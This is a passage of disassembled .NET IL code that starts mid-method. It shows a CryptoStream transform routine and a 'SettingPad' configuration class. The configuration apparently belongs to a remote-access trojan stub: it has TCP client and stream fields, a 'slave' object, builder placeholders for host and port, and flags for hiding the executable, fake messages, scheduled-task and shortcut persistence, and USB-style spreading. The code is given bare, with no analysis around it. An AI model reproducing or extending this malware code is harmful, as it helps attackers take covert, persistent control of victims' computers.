    IL_0015:  callvirt   instance void [mscorlib]System.Security.Cryptography.CryptoStream::Write(uint8[],
                                                                                                  int32,
                                                                                                  int32)
    IL_001a:  ldloc.0
    IL_001b:  callvirt   instance void [mscorlib]System.Security.Cryptography.CryptoStream::FlushFinalBlock()
    IL_0020:  ldloc.1
    IL_0021:  ldc.i4.0
    IL_0022:  conv.i8
    IL_0023:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0028:  ldloc.1
    IL_0029:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_002e:  ldc.i4.1
    IL_002f:  conv.i8
    IL_0030:  sub.ovf
    IL_0031:  conv.ovf.i4
    IL_0032:  ldc.i4.1
    IL_0033:  add.ovf
    IL_0034:  newarr     [mscorlib]System.Byte
    IL_0039:  stloc.2
    IL_003a:  ldloc.1
    IL_003b:  ldloc.2
    IL_003c:  ldc.i4.0
    IL_003d:  ldloc.2
    IL_003e:  ldlen
    IL_003f:  conv.ovf.i4
    IL_0040:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0045:  pop
    IL_0046:  ldloc.1
    IL_0047:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
    IL_004c:  ldloc.0
    IL_004d:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
    IL_0052:  ldloc.2
    IL_0053:  stloc.3
    IL_0054:  br.s       IL_0056

    IL_0056:  ldloc.3
    IL_0057:  ret
  } // end of method Security::Transform

} // end of class Q.Security

.class public auto ansi beforefieldinit Q.SettingPad
       extends [mscorlib]System.Object
{
  .field public static string[] HH
  .field public static string[] PN
  .field public static uint8[] B
  .field public static bool Kb
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static class [System]System.Net.Sockets.NetworkStream NT
  .field public static class [System]System.Net.Sockets.NetworkStream NT2
  .field public static bool Cn
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static int32 NH
  .field public static string NH1
  .field public static string HH2
  .field public static string PN2
  .field public static int32 NP
  .field public static string LC
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field public static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static object SlaveM
  .field public static string RG
  .field public static string VN
  .field public static string Y
  .field public static string Sl
  .field public static bool Ad
  .field public static bool Fo
  .field public static bool Fa
  .field public static string Fol
  .field public static bool HE
  .field public static string Ex
  .field public static bool Se
  .field public static bool Sh
  .field public static bool Bt
  .field public static string SeN
  .field public static string DR
  .field public static bool IsF
  .field public static bool Isu
  .field public static string Sti
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       396 (0x18c)
    .maxstack  3
    .locals init (string[] V_0)
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     bool Q.SettingPad::Kb
    IL_0006:  ldnull
    IL_0007:  stsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
    IL_000c:  ldc.i4.0
    IL_000d:  stsfld     bool Q.SettingPad::Cn
    IL_0012:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0017:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer Q.SettingPad::F
    IL_001c:  ldc.i4.0
    IL_001d:  stsfld     int32 Q.SettingPad::NH
    IL_0022:  ldstr      "[Wi]"
    IL_0027:  stsfld     string Q.SettingPad::NH1
    IL_002c:  ldstr      "[H]"
    IL_0031:  stsfld     string Q.SettingPad::HH2
    IL_0036:  ldstr      "[P]"
    IL_003b:  stsfld     string Q.SettingPad::PN2
    IL_0040:  ldc.i4.0
    IL_0041:  stsfld     int32 Q.SettingPad::NP
    IL_0046:  ldstr      ""
    IL_004b:  stsfld     string Q.SettingPad::LC
    IL_0050:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_0055:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_005a:  stsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
    IL_005f:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0064:  stsfld     class [mscorlib]System.IO.MemoryStream Q.SettingPad::MeM
    IL_0069:  ldnull
    IL_006a:  stsfld     object Q.SettingPad::MT
    IL_006f:  ldnull
    IL_0070:  stsfld     object Q.SettingPad::SlaveM
    IL_0075:  ldstr      "[RG]"
    IL_007a:  stsfld     string Q.SettingPad::RG
    IL_007f:  ldstr      "[VN]"
    IL_0084:  stsfld     string Q.SettingPad::VN
    IL_0089:  ldstr      "[Dep]"
    IL_008e:  stsfld     string Q.SettingPad::Y
    IL_0093:  ldstr      "[Slep]"
    IL_0098:  stsfld     string Q.SettingPad::Sl
    IL_009d:  ldstr      "[Ad]"
    IL_00a2:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00a7:  stsfld     bool Q.SettingPad::Ad
    IL_00ac:  ldstr      "[Flo]"
    IL_00b1:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00b6:  stsfld     bool Q.SettingPad::Fo
    IL_00bb:  ldstr      "[Fak]"
    IL_00c0:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00c5:  stsfld     bool Q.SettingPad::Fa
    IL_00ca:  ldstr      "[TFol]"
    IL_00cf:  stsfld     string Q.SettingPad::Fol
    IL_00d4:  ldstr      "[HDexe]"
    IL_00d9:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00de:  stsfld     bool Q.SettingPad::HE
    IL_00e3:  ldstr      "[EXE]"
    IL_00e8:  stsfld     string Q.SettingPad::Ex
    IL_00ed:  ldstr      "[Schl]"
    IL_00f2:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00f7:  stsfld     bool Q.SettingPad::Se
    IL_00fc:  ldstr      "[Sho]"
    IL_0101:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0106:  stsfld     bool Q.SettingPad::Sh
    IL_010b:  ldstr      "[Bat]"
    IL_0110:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0115:  stsfld     bool Q.SettingPad::Bt
    IL_011a:  ldstr      "[Scnam]"
    IL_011f:  stsfld     string Q.SettingPad::SeN
    IL_0124:  ldstr      "[DR]"
    IL_0129:  stsfld     string Q.SettingPad::DR
    IL_012e:  ldstr      "[Isf]"
    IL_0133:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0138:  stsfld     bool Q.SettingPad::IsF
    IL_013d:  ldstr      "[Isu]"
    IL_0142:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0147:  stsfld     bool Q.SettingPad::Isu
    IL_014c:  ldc.i4.5
    IL_014d:  newarr     [mscorlib]System.String
    IL_0152:  stloc.0
    IL_0153:  ldloc.0
    IL_0154:  ldc.i4.0
    IL_0155:  ldsfld     string Q.SettingPad::DR
    IL_015a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_015f:  stelem.ref
    IL_0160:  ldloc.0
    IL_0161:  ldc.i4.1
    IL_0162:  ldstr      "\\"
    IL_0167:  stelem.ref
    IL_0168:  ldloc.0
    IL_0169:  ldc.i4.2
    IL_016a:  ldsfld     string Q.SettingPad::Fol
    IL_016f:  stelem.ref
    IL_0170:  ldloc.0
    IL_0171:  ldc.i4.3
    IL_0172:  ldstr      "\\"
    IL_0177:  stelem.ref
    IL_0178:  ldloc.0
    IL_0179:  ldc.i4.4
    IL_017a:  ldsfld     string Q.SettingPad::RG
    IL_017f:  stelem.ref
    IL_0180:  ldloc.0
    IL_0181:  call       string [mscorlib]System.String::Concat(string[])
    IL_0186:  stsfld     string Q.SettingPad::Sti
    IL_018b:  ret
  } // end of method SettingPad::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method SettingPad::.ctor

} // end of class Q.SettingPad

.class private auto ansi sealed VB$AnonymousDelegate_0
       extends [mscorlib]System.MulticastDelegate
{
  .custom instance void [mscorlib]System.Diagnostics.DebuggerDisplayAttribute::.ctor(string) = ( 01 00 12 3C 67 65 6E 65 72 61 74 65 64 20 6D 65   // ...<generated me
                                                                                                 74 68 6F 64 3E 01 00 54 0E 04 54 79 70 65 12 3C   // thod>..T..Type.<
                                                                                                 67 65 6E 65 72 61 74 65 64 20 6D 65 74 68 6F 64   // generated method
                                                                                                 3E )                                              // >
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor(object TargetObject,
                               native int TargetMethod) runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::.ctor

  .method public newslot strict virtual instance class [mscorlib]System.IAsyncResult 
          BeginInvoke(class [mscorlib]System.AsyncCallback DelegateCallback,
                      object DelegateAsyncState) runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::BeginInvoke

  .method public newslot strict virtual instance void 
          EndInvoke(class [mscorlib]System.IAsyncResult DelegateAsyncResult) runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::EndInvoke

  .method public newslot strict virtual instance void 
          Invoke() runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::Invoke

} // end of class VB$AnonymousDelegate_0


// =============================================================

